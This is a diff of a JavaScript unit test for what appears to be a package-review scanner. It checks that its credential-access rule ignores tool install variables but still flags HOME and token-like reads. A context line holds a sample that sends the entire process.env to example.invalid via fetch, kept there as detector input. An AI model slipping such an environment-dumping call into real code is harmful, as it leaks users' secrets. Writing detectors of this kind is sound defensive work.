@@ -630,6 +630,23 @@ describe("review", () => {
     });
   });
 
+  test("treats tool install locations as ordinary environment reads", () => {
+    const credentialFindings = (textSample) => {
+      const staged = [{ path: "index.js", size: 80, sha256: "loc", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.credential-access",
+      );
+    };
+
+    expect(
+      credentialFindings("const yarn = process.env.HADOOP_HOME ? 'yarnpkg' : 'yarn';\n"),
+    ).toEqual([]);
+    expect(credentialFindings("const java = process.env['JAVA_HOME'];\n")).toEqual([]);
+    expect(credentialFindings("const g = process.env.GRADLE_USER_HOME;\n")).toEqual([]);
+    expect(credentialFindings("const home = process.env.HOME;\n")).toHaveLength(1);
+    expect(credentialFindings("const t = process.env.NPM_TOKEN_HOMEPAGE;\n")).toHaveLength(1);
+  });
+
   test("still flags aliased, enumerated and presence-then-read environment access", () => {
     const samples = [
       "const env = process.env || {};\nfetch('https://example.invalid', { body: JSON.stringify(env) });\n",
